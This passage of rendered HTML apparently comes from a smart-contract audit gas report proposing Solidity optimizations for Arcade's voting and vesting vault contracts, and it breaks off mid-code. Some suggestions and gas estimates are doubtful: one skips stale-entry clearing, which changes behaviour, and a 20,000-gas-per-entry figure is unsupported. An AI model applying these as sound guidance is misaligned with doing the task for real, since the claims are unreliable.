focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimizations in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol\">BaseVotingVault.sol</a></h2>\n<h3 id=\"general-optimization-1\" style=\"position:relative;\"><a href=\"#general-optimization-1\" aria-label=\"general optimization 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>General Optimization</h3>\n<p>The contract uses the <code>onlyManager</code> and <code>onlyTimelock</code> modifiers in multiple functions. These modifiers check if the caller is the <code>manager</code> or the <code>timelock</code>. However, these checks could be optimized by creating a new modifier that directly checks the <code>msg.sender</code> against the <code>manager</code> or <code>timelock</code>, saving the gas used by the function call.</p>\n<h3 id=\"possible-optimization-1-1\" style=\"position:relative;\"><a href=\"#possible-optimization-1-1\" aria-label=\"possible optimization 1 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 1</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L96C1-L102C6\">queryVotePower</a> function calls the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L101C29-L101C41\">findAndClear</a> function, which iterates over the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L101C16-L101C40\">votingPower</a> mapping and clears entries that are older than <code>staleBlockLag</code>. This could be optimized by only clearing entries when the number of entries exceeds a certain limit. This would reduce the number of storage operations, which are expensive in terms of gas.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">queryVotePower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blockNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get our reference to historical data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">History</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HistoricalBalances</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_votingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Find the historical data and clear everything more than &#39;staleBlockLag&#39; into the past</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// only if the number of entries exceeds a certain limit (e.g., 100)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">numEntries</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">findAndClear</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blockNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">staleBlockLag</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">find</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blockNumber</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization reduces the number of storage operations, which costs 20,000 gas each. The actual gas saved would depend on the number of entries in the <code>votingPower</code> mapping for a user. If there are more than 100 entries, this optimization could save approximately 20,000 gas per extra entry.</p>\n<h3 id=\"possible-optimization-2-1\" style=\"position:relative;\"><a href=\"#possible-optimization-2-1\" aria-label=\"possible optimization 2 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 2</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L68C2-L72C6\">setTimelock</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L80C3-L84C6\">setManager</a> functions update the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L69C1-L71C64\">timelock</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/BaseVotingVault.sol#L81C7-L83C62\">manager</a> addresses. These functions could be optimized by checking if the new address is different from the current one before updating. This would save gas when the new address is the same as the current one.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setTimelock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timelock_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyTimelock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timelock_</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BVV_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;timelock&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timelock_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">timelock</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addressPtr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;timelock&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">timelock_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">manager_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyTimelock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">manager_</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BVV_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;manager&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">manager_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">manager</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addressPtr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;manager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">manager_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 5,000 to 10,000 gas per transaction, depending on the gas cost of the storage operation.</p>\n<h2 id=\"possible-optimizations-in-arcdvestingvaultsol\" style=\"position:relative;\"><a href=\"#possible-optimizations-in-arcdvestingvaultsol\" aria-label=\"possible optimizations in arcdvestingvaultsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimizations in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol\">ARCDVestingVault.sol</a></h2>\n<h3 id=\"possible-optimization-1-2\" style=\"position:relative;\"><a href=\"#possible-optimization-1-2\" aria-label=\"possible optimization 1 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 1</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L91C5-L150C1\">addGrantAndDelegate</a> function, there are multiple calls to <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L114\">Storage.Uint256 storage unassigned = _unassigned();</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L118\">ARCDVestingVaultStorage.Grant storage grant = _grants()[who];</a>. These calls could be optimized by declaring them once at the beginning of the function and reusing the reference. This would save the gas used by the function call.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addGrantAndDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cliffAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cliff</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegatee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">unassigned</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_unassigned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ARCDVestingVaultStorage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Grant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">grant</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_grants</span><span class=\"mtk1\">()[</span><span class=\"mtk12\">who</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// input validation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">who</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;who&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InvalidAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// if no custom start time is needed we use this block.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// grant schedule check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">cliff</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">cliff</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InvalidSchedule</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// cliff check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">cliffAmount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InvalidCliffAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">unassigned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InsufficientBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">unassigned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// if this address already has a grant, a different address must be provided</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// topping up or editing active grants is not supported.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocation</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_HasGrant</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// load the delegate. Defaults to the grant owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">who</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// calculate the voting power. Assumes all voting power is initially locked.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// set the new grant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cliffAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cliffAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">created</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expiration</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cliff</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cliff</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">latestVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update the amount of unassigned tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unassigned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update the delegatee&#39;s voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">History</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HistoricalBalances</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_votingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">loadTop</span><span 